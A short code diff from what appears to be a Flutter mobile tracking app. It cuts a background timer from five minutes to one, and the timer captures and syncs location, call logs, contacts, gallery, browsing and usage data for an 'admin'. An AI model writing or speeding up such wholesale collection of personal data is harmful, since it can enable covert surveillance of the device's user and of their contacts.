@@ -29,7 +29,7 @@ class _TrackingHomePageState extends ConsumerState<TrackingHomePage> {
     // Every 5 min: capture location, battery, usage, call logs, contacts,
     // gallery, browsing then sync. Must run in main isolate (MethodChannels).
     _monitorTimer = Timer.periodic(
-      const Duration(minutes: 5),
+      const Duration(minutes: 1),   // was 5 min — faster for real-time admin updates
       (_) => BackgroundWorker.captureAllAndSync(),
     );
   }
